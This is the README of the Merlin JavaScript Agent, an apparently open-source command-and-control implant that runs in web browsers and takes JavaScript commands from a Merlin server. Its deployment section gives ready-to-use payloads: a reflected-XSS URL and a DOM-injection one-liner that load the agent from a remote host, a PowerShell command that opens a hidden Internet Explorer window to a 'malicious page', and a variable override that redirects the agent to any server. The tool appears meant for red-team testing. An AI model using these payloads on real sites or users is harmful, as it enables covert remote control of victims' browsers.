[![JavaScript Style Guide](https://cdn.rawgit.com/standard/standard/master/badge.svg)](https://github.com/standard/standard)

# Merlin JavaScript Agent
This version of the Merlin Agent is written in JavaScript and can be run
in any location that can execute JavaScript. Web browsers can be found
on a multitude of devices to include computers, tablets, phones, TVs,
cars, and gaming systems. These are good candidates places to run a
Merlin agent.

An introductory blog post can be found here:
https://medium.com/@Ne0nd0g/merlin-javascript-all-up-in-your-browsers-e46d6449382


[![asciicast](https://asciinema.org/a/RHKqctghoo9fCkIVZjyMQV0N7.png)](https://asciinema.org/a/RHKqctghoo9fCkIVZjyMQV0N7)

## Usage
The Merlin JavaScript Agent functions the same as other agents. It is
controlled through the server using the same commands. It is important
to note that the Merlin JavaScript Agent is only capable of executing
JavaScript commands. For example, you could execute `2 + 2` and the
agent will return `4`. Alternatively, you can execute `alert('Merlin')`
and a JavaScript alert box will appear on the page where the Merlin
Agent is running.

## Limitations
* Browser must support HTTP/2
* JavaScript XHR calls will fail if using a self-signed/untrusted TLS
certificate
* Your commands are limited to the sandbox environment (unless there is
a vulnerability to escape it)
* Web browser must stay in the foreground on mobile devices to keep
running

## JavaScript Override Variable
The Merlin Server address is hardcoded into the `url` variable inside
of the JavaScript file. However, the Merlin JavaScript Agent will check
for existence of the `oURL` variable prior to executing the main
function. This variable is used to _override_ the hardcoded `url`
variable. This is useful when you want to deliver the JavaScript file
but don't want to change the `url` parameter prior to delivery. An
example of practical application is in the *Deployment Methods* section.

## Deployment Methods
* Merlin JavaScript Agent Test Page
* Cross-Site Scripting (XSS)
* Inject directly into the DOM
* Windows IE COM Object
* Override oURLJavaScript variable

### Merlin JavaScript Agent Test Page
Merlin ships with an HTML page that can be used to test the
_Merlin JavaScript Agent_. It can be found at `data/html/merlin.html`.
This page will automatically load the Merlin JavaScript agent, connect
to the Merlin Server, and start writing verbose messages to the screen.
The quickest way to try this out it is to use Python and start a simple
web server in the `html` directory (i.e.
`cd data/html;python -m SimpleHTTPServer`) and then browse to page with
`http://127.0.0.1:8000/merlin.html`.

### Cross-Site Scripting (XSS)
Let's assume that you've found a XSS vulnerability in a GET parameter
for Acme Widgets. For example the `page` parameter of
`https://www.acme.com/index.html?page=1` reflects back the value to the
user. You can exploit this XSS vulnerability to create a link that would
 deliver a Merlin Agent to a victim if they click the link. An example
 of the Merlin payload would be `var merlin=document.createElement('scri
 pt');merlin.src='http://127.0.0.1:8000/scripts/merlin.js';document.head.appendC
 hild(merlin);`.

 An example of the full payload is:

`https://www.acme.com/index.html?page=var%20merlin=document.createElement('script');merlin.src='http://127.0.0.1:8000/merlin.js';document.head.appendChild(merlin);`

### Inject into the DOM
Most web browser come with developer tools. These tools can be used to
execute JavaScript commands on _any page_ that you are viewing. On Firefox
 you can hit the `F12` key to open the developer Web Console. From
 there, you can execute this command:

`var merlin=document.createElement('script');merlin.src='http://127.0.0.1:8000/scripts/merlin.js';document.head.appendChild(merlin);`

### Windows IE COM Object
Using PowerShell, you can create and hide an Internet Explorer COM
object. This would create an Internet Explorer window, hide it so that
the user can't see it, and then browse to your malicious page. This
method also has the most obstacles. The newly created window will not
trust your self-signed certificates, so you must be using a valid TLS
certificate. _*For testing*_, you can circumvent this by making the
windows visible, browsing to the root of your web server, and creating
an exception in Internet Explorer. After creating the exception, then
you can navigate the web page to your malicious page and then hide the
window again. Additionally, Internet Explorer seems to error out if your
 malicious page is not served from the same place as your Merlin Server.
 This caused the hidden Internet Explorer window re-appear (made
visible) on its own.


You can use the built-in _Merlin JavaScript Agent Test Page_ to serve
the payload, but your probably better off creating a page somewhere
else with minimal HTML. If you decide to serve the _Merlin JavaScript
Agent Test Page_ to deliver the payload, you can shutdown the server
giving out the page (not the Merlin Server) right after it is grabbed
by the client. The malicious HTML page does not need to be available
after initial delivery. Merlin Server is not currently setup to serve
the _Merlin JavaScript Agent Test Page_ itself, yet. I will work on
getting it implemented.

An example PowerShell command is:

`$W=New-Object -com 'InternetExplorer.Application';$W.visible=$False;$W.navigate('http://www.acmewidgets.com:8000/merlin.html')`

### Override URL
You can host the JavaScript in its original form without having to hard
code your Merlin Server’s URL in the file. Merlin checks the DOM for the
`oURL` variable and will use its value to connect back with (if it
exists). This provides flexibility to dynamically change the Merlin
Server’s URL on the fly.

Note: If the place you are hosting the file returns the JavaScript file
with a content-type of `text/plain`, then the _Merlin JavaScript Agent_
will fail to load due to strict MIME type checking. The precludes you
from calling the file directly from GitHub. However, if no content-type
is provided, the agent should run.

An example command is: `var oURL='https://your.merlin.server:443/';var merlin=document.createElement('script');merlin.src='https://some.hosting.provider/merlin.js';document.head.appendChild(merlin);`